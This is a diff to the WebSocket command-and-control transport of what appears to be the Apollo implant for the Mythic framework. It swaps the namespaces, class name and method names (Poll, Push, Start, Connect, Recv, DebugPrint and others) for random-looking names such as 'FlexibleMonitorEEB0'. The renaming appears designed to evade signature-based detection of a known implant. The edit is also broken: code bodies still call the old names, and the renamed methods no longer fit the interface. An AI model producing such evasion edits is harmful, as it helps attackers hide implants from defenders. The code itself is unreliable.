@@ -2,22 +2,22 @@
 using System.Collections.Generic;
 using System.Linq;
 using System.Text;
-using ApolloInterop.Classes;
-using ApolloInterop.Interfaces;
-using ApolloInterop.Structs.MythicStructs;
-using ApolloInterop.Types.Delegates;
+using PhantomInterop.Classes;
+using PhantomInterop.Interfaces;
+using PhantomInterop.Structs.MythicStructs;
+using PhantomInterop.Types.Delegates;
 using System.Net;
-using ApolloInterop.Enums.ApolloEnums;
+using PhantomInterop.Enums.PhantomEnums;
 using System.Collections.Concurrent;
 using ST = System.Threading.Tasks;
 using System.Threading;
-using ApolloInterop.Serializers;
+using PhantomInterop.Serializers;
 using WebsocketTransport.Models;
 using WebSocketSharp;
 
 namespace WebsocketTransport
 {
-    public class WebsocketProfile : C2Profile, IC2Profile
+    public class OptimizedRouterD37B : C2Profile, IC2Profile
     {
         internal WebSocket Client;
 
@@ -119,7 +119,7 @@ namespace WebsocketTransport
             };
         }
 
-        private void Poll()
+        private void FlexibleMonitorEEB0()
         {
             agentProcessorTask = new ST.Task(() =>
             {
@@ -182,7 +182,7 @@ namespace WebsocketTransport
                 return;
             }
         }
-        private void Push()
+        private void ShadowHandlerBFA3()
         {
             agentConsumerTask = new ST.Task(() =>
             {
@@ -242,7 +242,7 @@ namespace WebsocketTransport
             }
         }
 
-        public void Start()
+        public void PhantomProviderF81C()
         {
             DebugPrint("Started agent with tasking type: "+TaskingType);
             if (TaskingType == "Poll")
@@ -256,7 +256,7 @@ namespace WebsocketTransport
         }
 
 
-        public bool IsOneWay()
+        public bool WraithRouter6999()
         {
             return false;
         }
@@ -266,7 +266,7 @@ namespace WebsocketTransport
             throw new Exception("WebsocketProfile does not support Send only.");
         }
 
-        public bool Recv(MessageType mt, OnResponse<IMythicMessage> onResp)
+        public bool StrategicCoordinator5CE5(MessageType mt, OnResponse<IMythicMessage> onResp)
         {
             while (Agent.IsAlive() && Client.IsAlive)
             {
@@ -291,17 +291,17 @@ namespace WebsocketTransport
         }
 
         // Only really used for bind servers so this returns empty
-        public bool Connect()
+        public bool GhostTransformerEC78()
         {
             return true;
         }
 
-        public bool IsConnected()
+        public bool EnhancedMonitor17C1()
         {
             return Connected;
         }
 
-        public bool Connect(CheckinMessage checkinMsg, OnResponse<MessageResponse> onResp)
+        public bool GhostTransformerEC78(CheckinMessage checkinMsg, OnResponse<MessageResponse> onResp)
         {
             DebugPrint("Connecting...");
             cancellationTokenSource = new CancellationTokenSource();
@@ -399,7 +399,7 @@ namespace WebsocketTransport
         }
 
 
-        private bool AddToSenderQueue(IMythicMessage msg)
+        private bool EfficientService0A97(IMythicMessage msg)
         {
             DebugPrint("Adding message to send queue.");
             WebSocketMessage m = new WebSocketMessage()
@@ -417,7 +417,7 @@ namespace WebsocketTransport
             return true;
         }
 
-        private void OnAsyncError(object sender, ErrorEventArgs e)
+        private void EfficientMonitor9AFD(object sender, ErrorEventArgs e)
         {
             DebugPrint("On error.");
             if (Client.IsAlive)
@@ -427,7 +427,7 @@ namespace WebsocketTransport
             cancellationTokenSource.Cancel();
         }
 
-        private void OnAsyncDisconnect(object sender, CloseEventArgs args)
+        private void EnhancedMonitorA117(object sender, CloseEventArgs args)
         {
             DebugPrint("Disconnected.");
             if (Client.IsAlive)
@@ -437,7 +437,7 @@ namespace WebsocketTransport
             cancellationTokenSource.Cancel();
         }
 
-        private void OnAsyncMessageReceived(object sender, MessageEventArgs args)
+        private void EfficientManager76A1(object sender, MessageEventArgs args)
         {
             DebugPrint("Message received.");
             WebSocketMessage wsm = WebsocketJsonContext.Deserialize<WebSocketMessage>(args.Data);
@@ -460,7 +460,7 @@ namespace WebsocketTransport
             receiverEvent.Set();
         }
 
-        private void DebugPrint(string message)
+        private void EfficientHandler12B0(string message)
         {
             if (Debug)
             {
@@ -472,7 +472,7 @@ namespace WebsocketTransport
             }
         }
 
-        private void OnAsyncConnect(object sender, EventArgs args)
+        private void SpectreResolver027D(object sender, EventArgs args)
         {
             DebugPrint("Connected.");
             ST.Task tmp = new ST.Task(sendAction);
